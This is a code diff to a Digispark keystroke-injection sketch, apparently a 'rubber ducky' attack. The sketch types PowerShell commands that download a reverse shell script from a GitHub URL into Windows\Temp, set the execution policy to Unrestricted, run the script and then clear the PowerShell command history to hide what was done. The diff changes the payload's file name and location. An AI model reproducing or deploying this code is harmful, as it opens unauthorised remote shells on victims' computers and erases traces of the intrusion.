@@ -26,7 +26,7 @@ void loop(){
   //Open a powershell client and download remote reverse shell script
   DigiKeyboard.print("$client = New-Object System.Net.WebClient");
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
-  DigiKeyboard.print("$client.DownloadFile('https://raw.githubusercontent.com/XALM1337X/Quick-Reverse-Powershell-Rubber-Ducky/master/rs.ps1', 'C:\\rs.ps1')");
+  DigiKeyboard.print("$client.DownloadFile('https://raw.githubusercontent.com/XALM1337X/Quick-Reverse-Powershell-Rubber-Ducky/master/rs_tsk.ps1', 'C:\\Windows\\Temp\\rs_tsk.ps1')");
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
   
   DigiKeyboard.print("Set-ExecutionPolicy -ExecutionPolicy Unrestricted");
@@ -37,13 +37,10 @@ void loop(){
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
   DigiKeyboard.delay(500);
   
-  DigiKeyboard.print("powershell C:\\rs.ps1");
+  DigiKeyboard.print("powershell C:\\Windows\\Temp\\rs_tsk.ps1");
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
-  DigiKeyboard.delay(500);    
-  //TODO: Schedule task using to run reverse shell script
-  
-  //Testing
-  
+  DigiKeyboard.delay(500);
+      
   
   //Delete all powershell command line history in current session and delete session.
   DigiKeyboard.print("[Microsoft.PowerShell.PSConsoleReadLine]::ClearHistory()");
